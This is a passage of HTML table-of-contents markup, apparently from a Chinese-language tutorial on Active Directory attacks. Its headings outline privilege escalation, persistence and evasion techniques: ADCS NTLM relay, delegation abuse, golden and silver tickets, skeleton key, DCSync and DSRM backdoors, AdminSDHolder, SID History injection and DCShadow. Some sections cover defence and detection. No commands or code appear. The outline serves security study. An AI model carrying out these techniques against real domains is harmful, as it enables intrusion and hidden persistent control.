href="#5-ADCS%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88NTLM%E4%B8%AD%E7%BB%A7%EF%BC%89"><span class="toc-number">7.5.</span> <span class="toc-text">5.ADCS证书服务攻击（NTLM中继）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">7.5.1.</span> <span class="toc-text">一、漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">7.5.2.</span> <span class="toc-text">二、利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">7.5.3.</span> <span class="toc-text">三、利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">7.5.3.1.</span> <span class="toc-text">1. 环境准备与检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E9%85%8D%E7%BD%AENTLM%E4%B8%AD%E7%BB%A7"><span class="toc-number">7.5.3.1.1.</span> <span class="toc-text">2. 配置NTLM中继</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%A7%A6%E5%8F%91NTLM%E8%AE%A4%E8%AF%81"><span class="toc-number">7.5.3.2.</span> <span class="toc-text">3. 触发NTLM认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6"><span class="toc-number">7.5.3.3.</span> <span class="toc-text">4. 获取伪造证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%94%B3%E8%AF%B7%E9%AB%98%E6%9D%83%E9%99%90%E7%A5%A8%E6%8D%AE"><span class="toc-number">7.5.3.4.</span> <span class="toc-text">5. 申请高权限票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.5.3.5.</span> <span class="toc-text">6. 权限提升与横向移动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%98%B2%E5%BE%A1%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">7.5.4.</span> <span class="toc-text">四、防御与缓解措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%B7%A5%E5%85%B7%E4%B8%8E%E8%B5%84%E6%BA%90"><span class="toc-number">7.5.5.</span> <span class="toc-text">五、工具与资源</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E5%A7%94%E6%B4%BE"><span class="toc-number">8.</span> <span class="toc-text">八、域权限提升-委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%A7%94%E6%B4%BE%E6%8F%90%E6%9D%83%E7%9A%84%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6"><span class="toc-number">8.1.</span> <span class="toc-text">一、委派提权的核心机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A7%94%E6%B4%BE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">8.2.</span> <span class="toc-text">二、委派类型与攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%EF%BC%88Unconstrained-Delegation%EF%BC%89"><span class="toc-number">8.2.1.</span> <span class="toc-text">1. 非约束委派（Unconstrained Delegation）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%EF%BC%88Constrained-Delegation%EF%BC%89"><span class="toc-number">8.2.2.</span> <span class="toc-text">2. 约束委派（Constrained Delegation）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%EF%BC%88Resource-Based-Constrained-Delegation-RBCD%EF%BC%89"><span class="toc-number">8.2.3.</span> <span class="toc-text">3. 基于资源的约束委派（Resource-Based Constrained Delegation, RBCD）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">8.3.</span> <span class="toc-text">三、攻击工具与检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">8.3.1.</span> <span class="toc-text">1. 常用工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%98%B2%E5%BE%A1%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="toc-number">8.3.2.</span> <span class="toc-text">2. 防御与检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">8.4.</span> <span class="toc-text">四、总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">9.</span> <span class="toc-text">九、域权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-Ticket%EF%BC%89"><span class="toc-number">9.1.</span> <span class="toc-text">1.黄金票据（Golden Ticket）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.1.</span> <span class="toc-text">一、黄金票据的核心原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">9.1.2.</span> <span class="toc-text">二、攻击前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%94%9F%E6%88%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">9.1.3.</span> <span class="toc-text">三、黄金票据生成与利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E8%8E%B7%E5%8F%96-krbtgt-%E8%B4%A6%E6%88%B7%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">9.1.3.1.</span> <span class="toc-text">步骤 1：获取 krbtgt 账户的凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E7%94%9F%E6%88%90%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.1.3.2.</span> <span class="toc-text">步骤 2：生成黄金票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E6%9D%83%E9%99%90%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">9.1.3.3.</span> <span class="toc-text">步骤 3：权限验证与利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90"><span class="toc-number">9.1.4.</span> <span class="toc-text">四、技术原理深度解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%88Silver-Ticket%EF%BC%89"><span class="toc-number">9.2.</span> <span class="toc-text">2.白银票据（Silver Ticket）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">9.2.0.1.</span> <span class="toc-text">一、白银票据的核心原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">9.2.0.2.</span> <span class="toc-text">二、攻击前提条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%94%9F%E6%88%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">9.2.0.3.</span> <span class="toc-text">三、白银票据生成与利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">9.2.0.3.1.</span> <span class="toc-text">步骤 1：获取服务账户的凭据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E7%94%9F%E6%88%90%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.2.0.3.2.</span> <span class="toc-text">步骤 2：生成白银票据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E6%9D%83%E9%99%90%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8-1"><span class="toc-number">9.2.0.3.3.</span> <span class="toc-text">步骤 3：权限验证与利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-1"><span class="toc-number">9.2.0.4.</span> <span class="toc-text">四、技术原理深度解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-vs-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.2.0.5.</span> <span class="toc-text">五、白银票据 vs. 黄金票据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">9.3.</span> <span class="toc-text">3.万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-number">9.3.1.</span> <span class="toc-text">一、万能密码的核心概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F"><span class="toc-number">9.3.2.</span> <span class="toc-text">二、技术实现方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Skeleton-Key%EF%BC%88%E9%AA%A8%E6%9E%B6%E5%AF%86%E9%92%A5%EF%BC%89"><span class="toc-number">9.3.2.1.</span> <span class="toc-text">1. Skeleton Key（骨架密钥）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%81%B6%E6%84%8F%E5%AE%89%E5%85%A8%E6%94%AF%E6%8C%81%E6%8F%90%E4%BE%9B%E8%80%85%EF%BC%88SSP%EF%BC%89"><span class="toc-number">9.3.2.2.</span> <span class="toc-text">2. 恶意安全支持提供者（SSP）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AF%86%E7%A0%81%E7%AD%9B%E9%80%89%E5%99%A8%E5%90%8E%E9%97%A8%EF%BC%88Password-Filter-DLL%EF%BC%89"><span class="toc-number">9.3.2.3.</span> <span class="toc-text">3. 密码筛选器后门（Password Filter DLL）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BF%AE%E6%94%B9NTDS-dit%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">9.3.2.4.</span> <span class="toc-text">4. 修改NTDS.dit数据库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-DCSync-%E5%90%8E%E9%97%A8"><span class="toc-number">9.4.</span> <span class="toc-text">4.DCSync 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">9.4.1.</span> <span class="toc-text">二、攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8E%88%E4%BA%88DCSync%E6%9D%83%E9%99%90"><span class="toc-number">9.4.1.1.</span> <span class="toc-text">1. 授予DCSync权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E9%9A%90%E8%94%BD%E8%B4%A6%E6%88%B7%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="toc-number">9.4.1.2.</span> <span class="toc-text">2. 创建隐蔽账户（可选）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%89%A7%E8%A1%8CDCSync%E5%AF%BC%E5%87%BA%E5%93%88%E5%B8%8C"><span class="toc-number">9.4.1.3.</span> <span class="toc-text">3. 执行DCSync导出哈希</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B8%8E%E9%9A%90%E8%94%BD%E6%89%8B%E6%AE%B5"><span class="toc-number">9.4.2.</span> <span class="toc-text">三、权限维持与隐蔽手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ACL%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF"><span class="toc-number">9.4.2.1.</span> <span class="toc-text">1. ACL隐藏技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%97%A5%E5%BF%97%E7%BB%95%E8%BF%87"><span class="toc-number">9.4.2.2.</span> <span class="toc-text">2. 日志绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AE%9A%E6%9C%9F%E5%90%8C%E6%AD%A5%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">9.4.2.3.</span> <span class="toc-text">3. 定期同步与自动化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-DSRM"><span class="toc-number">9.5.</span> <span class="toc-text">5.DSRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81DSRM-%E7%9A%84%E6%A0%B8%E5%BF%83%E4%BD%9C%E7%94%A8"><span class="toc-number">9.5.1.</span> <span class="toc-text">一、DSRM 的核心作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81DSRM-%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">9.5.2.</span> <span class="toc-text">二、DSRM 权限持久化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">9.5.3.</span> <span class="toc-text">三、攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D-DSRM-%E5%AF%86%E7%A0%81"><span class="toc-number">9.5.3.1.</span> <span class="toc-text">1. 获取当前 DSRM 密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9-DSRM-%E5%AF%86%E7%A0%81"><span class="toc-number">9.5.3.2.</span> <span class="toc-text">2. 修改 DSRM 密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%90%AF%E7%94%A8-DSRM-%E7%99%BB%E5%BD%95"><span class="toc-number">9.5.3.3.</span> <span class="toc-text">3. 启用 DSRM 登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%8C%81%E4%B9%85%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">9.5.3.4.</span> <span class="toc-text">4. 持久化利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-AdminSDHolder%E4%B8%8E%E5%BD%B1%E5%AD%90%E7%BB%84"><span class="toc-number">9.6.</span> <span class="toc-text">6.AdminSDHolder与影子组</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81AdminSDHolder%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">9.6.1.</span> <span class="toc-text">一、AdminSDHolder的核心原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%BD%B1%E5%AD%90%E7%BB%84%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E4%BD%9C%E7%94%A8"><span class="toc-number">9.6.2.</span> <span class="toc-text">二、影子组的定义与作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">9.6.3.</span> <span class="toc-text">三、攻击流程详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%BD%B1%E5%AD%90%E7%BB%84"><span class="toc-number">9.6.3.1.</span> <span class="toc-text">步骤 1：创建影子组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E4%BF%AE%E6%94%B9AdminSDHolder%E7%9A%84ACL"><span class="toc-number">9.6.3.2.</span> <span class="toc-text">步骤 2：修改AdminSDHolder的ACL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E8%A7%A6%E5%8F%91SDProp%E5%90%8C%E6%AD%A5"><span class="toc-number">9.6.3.3.</span> <span class="toc-text">步骤 3：触发SDProp同步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-4%EF%BC%9A%E9%80%9A%E8%BF%87%E5%BD%B1%E5%AD%90%E7%BB%84%E8%A1%8C%E4%BD%BF%E7%89%B9%E6%9D%83"><span class="toc-number">9.6.3.4.</span> <span class="toc-text">步骤 4：通过影子组行使特权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-2"><span class="toc-number">9.6.4.</span> <span class="toc-text">四、技术原理深度解析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E4%BA%A4%E5%8F%89%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB"><span class="toc-number">10.</span> <span class="toc-text">十、交叉信任攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BA%A4%E5%8F%89%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">10.1.</span> <span class="toc-text">一、交叉信任攻击的核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">10.2.</span> <span class="toc-text">二、攻击前提条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E4%B8%8E%E6%89%8B%E6%B3%95"><span class="toc-number">10.3.</span> <span class="toc-text">三、攻击流程与手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8F%90%E5%8F%96%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5"><span class="toc-number">10.3.1.</span> <span class="toc-text">1. 提取信任密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BC%AA%E9%80%A0%E8%B7%A8%E5%9F%9F%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">10.3.2.</span> <span class="toc-text">2. 伪造跨域黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE"><span class="toc-number">10.3.3.</span> <span class="toc-text">3. 跨域资源访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-SID-History-%E6%B3%A8%E5%85%A5%EF%BC%88%E8%B7%A8%E5%9F%9F%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-number">10.3.4.</span> <span class="toc-text">4. SID History 注入（跨域提权）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%8E%B7%E5%8F%96%E6%BA%90%E5%9F%9F%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="toc-number">10.3.4.0.1.</span> <span class="toc-text">步骤1：获取源域控制权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E5%9F%9F%E9%AB%98%E6%9D%83%E9%99%90SID"><span class="toc-number">10.3.4.0.2.</span> <span class="toc-text">步骤2：确定目标域高权限SID</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E6%B3%A8%E5%85%A5SID-History"><span class="toc-number">10.3.4.0.3.</span> <span class="toc-text">步骤3：注入SID History</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="toc-number">10.3.4.0.4.</span> <span class="toc-text">步骤4：跨域访问与提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BF%A1%E4%BB%BB%E7%B1%BB%E5%9E%8B%E4%B8%8E%E6%94%BB%E5%87%BB%E5%BD%B1%E5%93%8D"><span class="toc-number">10.4.</span> <span class="toc-text">四、信任类型与攻击影响</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E6%A3%AE%E6%9E%97%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96DCShadow"><span class="toc-number">11.</span> <span class="toc-text">十一、森林权限持久化DCShadow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81DCShadow%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">11.1.</span> <span class="toc-text">一、DCShadow攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-1"><span class="toc-number">11.2.</span> <span class="toc-text">二、攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">11.2.1.</span> <span class="toc-text">1. 环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%A8%E5%86%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">11.2.2.</span> <span class="toc-text">2. 注册恶意域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AF%A1%E6%94%B9AD%E5%AF%B9%E8%B1%A1"><span class="toc-number">11.2.3.</span> <span class="toc-text">3. 篡改AD对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%A7%A6%E5%8F%91%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%B8%85%E7%90%86"><span class="toc-number">11.2.4.</span> <span class="toc-text">4. 触发复制与清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%8A%80%E6%9C%AF%E4%BC%98%E5%8A%BF%E4%B8%8E%E9%9A%90%E8%94%BD%E6%80%A7"><span class="toc-number">11.3.</span> <span class="toc-text">三、技术优势与隐蔽性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E7%A4%BA%E4%BE%8B"><span class="toc-number">11.4.</span> <span class="toc-text">四、攻击场景示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1%EF%BC%9A%E9%9A%90%E8%94%BD%E6%8F%90%E6%9D%83"><span class="toc-number">11.4.1.</span> <span class="toc-text">场景1：隐蔽提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2%EF%BC%9AACL%E5%90%8E%E9%97%A8"><span class="toc-number">11.4.2.</span> <span class="toc-text">场景2：ACL后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">11.5.</span> <span class="toc-text">五、检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">11.5.1.</span> <span class="toc-text">1. 检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">11.5.2.</span> <span class="toc-text">2. 防御措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%B8%85%E9%99%A4%E5%90%8E%E9%97%A8"><span class="toc-number">11.6.</span> <span class="toc-text">六、清除后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">11.7.</span> <span class="toc-text">七、总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E5%85%B6%E4%BB%96%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">12.</span> <span class="toc-text">十二、其他补充知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE%E9%99%8D%E7%BA%A7%E8%BF%9B%E8%A1%8CNTLM%E5%97%85%E6%8E%A2"><span class="toc-number">12.1.</span> <span class="toc-text">一.利用协议降级进行NTLM嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%EF%BC%9A%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BC%B1%E7%82%B9"><span class="toc-number">12.1.1.</span> <span class="toc-text">1. 